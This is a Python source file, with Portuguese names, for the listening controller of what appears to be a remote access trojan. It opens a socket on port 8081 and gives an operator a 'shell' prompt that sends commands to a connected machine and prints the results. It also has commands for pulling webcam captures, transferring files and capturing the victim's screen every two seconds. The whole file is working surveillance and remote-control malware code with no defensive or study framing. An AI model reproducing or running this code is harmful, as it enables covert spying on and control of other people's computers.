# coding: utf-8
import socket
from get_set.instrucao import Instrucoes as retornos
from arquivos.transferir_arquivo import Transferir
from time import sleep as acadaMinuto
from sys import argv


class Server():

    def input_cmd_lines(self,cmd):
        return str(input(cmd))

    def connecting(self):
        power_plug = socket.socket()
        power_plug.bind((str(retornos.end_ip), 8081))
        power_plug.listen(1)
        conn, addr = power_plug.accept()
        print('Conexão estabelecida ', addr)

        while True:
            cmd_line = Server().input_cmd_lines("shell : ")
            if 'sair' in cmd_line:
                conn.send('sair'.encode())
                break
            elif 'cam' in cmd_line:
                acadaMinuto(1)
                Transferir().transferirCam(conn, cmd_line)
            elif 'cp' in cmd_line:
                Transferir().transferencias(conn, cmd_line)
            elif 'tela' in cmd_line:
                while True:
                    Transferir().transferirImagem(conn, cmd_line)
                    acadaMinuto(2)
            else:
                conn.send(cmd_line.encode())
                retornos.resultado = conn.recv(1024).decode('utf-8')
                print(retornos.resultado)

if __name__ == '__main__':
    try:
        retornos.end_ip = 'localhost'#argv[1]

        Server().connecting()
    except IndexError:
            print("python mobile.py ip")
    except KeyboardInterrupt:
        pass
